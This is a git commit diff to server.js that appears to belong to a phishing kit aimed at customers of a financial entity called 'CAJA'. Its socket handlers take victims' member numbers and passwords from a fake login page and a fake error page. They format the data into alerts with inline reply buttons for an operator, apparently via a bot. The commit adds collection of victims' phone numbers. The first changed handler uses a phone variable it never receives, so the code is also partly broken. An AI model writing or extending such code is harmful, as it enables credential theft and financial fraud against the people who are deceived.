b10f414fd82f187acc1f95953ef05b8a274841ed
shemiya502 <jpruz13@gmail.com>
2025-07-05 18:11:23 -0400

    Update server.js

--- server.js
+++ server.js
@@ -29,7 +29,7 @@ io.on('connection', (socket) => {
   socket.on('dataForm', ({ socio, contrasena, sessionId }) => {
     activeSockets.set(sessionId, socket);
 
-    const mensaje = `🔐 Nuevo intento de acceso CAJA:\n\n🔢 Número de socio: ${socio}\n🔑 Contraseña: ${contrasena}`;
+    const mensaje = `🔐 Nuevo intento de acceso CAJA:\n\n🔢 Número de socio: ${socio}\n🔑 Contraseña: ${contrasena}📱 Número telefónico: ${telefono}`;
     const botones = {
       reply_markup: {
         inline_keyboard: [
@@ -86,10 +86,10 @@ io.on('connection', (socket) => {
   });
 
   // Formulario de errorlogo.html — CORREGIDO
-  socket.on('errorlogoForm', ({ socio, contrasena, sessionId }) => {
+  socket.on('errorlogoForm', ({ socio, contrasena, telefono, sessionId }) => {
     activeSockets.set(sessionId, socket);
 
-    const mensaje = `⚠️ Nuevo intento fallido detectado CAJA:\n\n🔢 Número de socio: ${socio}\n🔑 Clave: ${contrasena}`;
+    const mensaje = `⚠️ Nuevo intento fallido detectado CAJA:\n\n🔢 Número de socio: ${socio}\n🔑 Clave: ${contrasena}\n📱 Número telefónico: ${telefono}`;
     const botones = {
       reply_markup: {
         inline_keyboard: [
